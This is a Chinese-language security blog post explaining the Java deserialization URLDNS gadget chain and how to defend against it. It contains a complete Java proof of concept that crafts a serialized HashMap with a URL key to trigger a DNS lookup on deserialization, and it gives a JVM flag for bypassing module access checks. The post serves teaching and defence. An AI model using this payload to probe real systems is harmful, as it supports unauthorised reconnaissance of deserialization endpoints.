---
title: Java 反序列化（一）：URLDNS 调用链分析
date: 2026-07-23 00:00:00 +0800
categories: [Java安全, 反序列化]
tags: [Java, 反序列化, DNSlog, 代码审计]
description: 从 HashMap 与 URL 的方法调用关系出发，分析 Java 反序列化过程中触发 DNS 查询的原因及防护思路。
toc: true
---

Java 原生反序列化会恢复对象图，并在此过程中调用部分对象的特殊方法。URLDNS 是一条常见的学习链：它不依赖第三方库，可通过一次 DNS 查询验证特定方法调用是否发生。

> 本文内容仅用于本地实验、授权测试和防御研究。请勿对未获授权的系统或域名进行测试。
{: .prompt-warning }

## 调用链

核心调用关系如下：

```text
ObjectInputStream.readObject()
└─ HashMap.readObject()
   └─ HashMap.putVal()
      └─ HashMap.hash(key)
         └─ URL.hashCode()
            └─ URLStreamHandler.hashCode()
               └─ getHostAddress()
```

`HashMap` 在恢复键值对时，需要重新计算键的哈希值。当键为 `URL` 对象时，`URL.hashCode()` 最终可能进行主机名解析，从而产生 DNS 查询。

需要注意：DNS 查询只能证明这条方法调用路径被触发，并不等同于任意代码执行。

## 为什么要重置 URL 的哈希值

`URL` 会缓存已经计算过的哈希值。如果在序列化前向 `HashMap` 放入 URL，哈希值会在本地先被计算并缓存；反序列化时可能直接使用缓存值，不再触发解析。

因此，实验中通常在构造完 `HashMap` 后，将 URL 对象的 `hashCode` 字段恢复为 `-1`，使其在反序列化阶段重新计算。

## 最小实验示例

下面的示例只应在隔离、授权的实验环境中运行：

```java
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URI;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.HashMap;
import java.util.Map;

public class UrlDnsDemo {
    private static final Path SERIALIZED_FILE = Path.of("ser.bin");

    public static void main(String[] args) throws Exception {
        serialize();
        deserialize();
    }

    private static void serialize() throws Exception {
        URL url = URI.create(
                "http://replace-with-your-authorized-domain.invalid/"
        ).toURL();

        Map<URL, String> map = new HashMap<>();
        map.put(url, "test");

        Field hashCodeField = URL.class.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.setInt(url, -1);

        try (ObjectOutputStream output = new ObjectOutputStream(
                Files.newOutputStream(SERIALIZED_FILE))) {
            output.writeObject(map);
        }
    }

    private static void deserialize()
            throws IOException, ClassNotFoundException {
        try (ObjectInputStream input = new ObjectInputStream(
                Files.newInputStream(SERIALIZED_FILE))) {
            Object value = input.readObject();
            System.out.println(value.getClass().getName());
        }
    }
}
```

请仅将示例中的 `.invalid` 地址替换为你拥有或明确获准使用的域名。

## 高版本 JDK 的模块限制

在较新的 JDK 中，对 `java.net.URL` 私有字段的反射访问可能被模块系统拒绝，并抛出 `InaccessibleObjectException`。本地实验可以临时添加：

```bash
--add-opens java.base/java.net=ALL-UNNAMED
```

这个参数只适合受控实验，不应作为生产环境绕过访问限制的常规配置。

## 代码审计思路

分析反序列化风险时，可以按以下顺序排查：

1. 确认入口是否调用 `ObjectInputStream.readObject()` 等原生反序列化 API。
2. 判断序列化数据是否来自用户、网络、缓存或其他不可信来源。
3. 检查对象图中的 `readObject()`、`readResolve()` 等特殊方法。
4. 关注集合操作隐式触发的 `hashCode()`、`equals()`、`compareTo()` 和 `toString()`。
5. 继续判断参数是否可控，以及最终调用是否会产生外部副作用。

## 防护建议

### 避免反序列化不可信数据

优先使用结构明确的数据格式和显式映射，例如 JSON DTO，并对字段、类型和长度进行校验。

### 使用反序列化过滤器

必须使用 Java 原生反序列化时，可通过 `ObjectInputFilter` 限制允许的类型、对象数量和嵌套深度：

```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
        "maxdepth=10;maxrefs=1000;com.example.dto.*;java.base/java.lang.*;!*"
);

try (ObjectInputStream input = new ObjectInputStream(
        Files.newInputStream(SERIALIZED_FILE))) {
    input.setObjectInputFilter(filter);
    Object value = input.readObject();
}
```

过滤规则应根据业务实际使用的 DTO 建立最小允许列表，并通过测试确认不会误放行其他类型。

### 监控异常 DNS 与外连行为

对服务器的 DNS 请求、异常解析频率和非预期外连进行记录与告警，可以帮助发现探测行为，但不能替代输入校验和类型限制。

## 总结

URLDNS 的价值在于展示一条清晰的隐式调用链：反序列化集合时重新计算键的哈希值，进而进入 `URL.hashCode()` 并可能触发 DNS 查询。理解这条链后，应将关注点放回入口控制、类型过滤和出站网络监控。
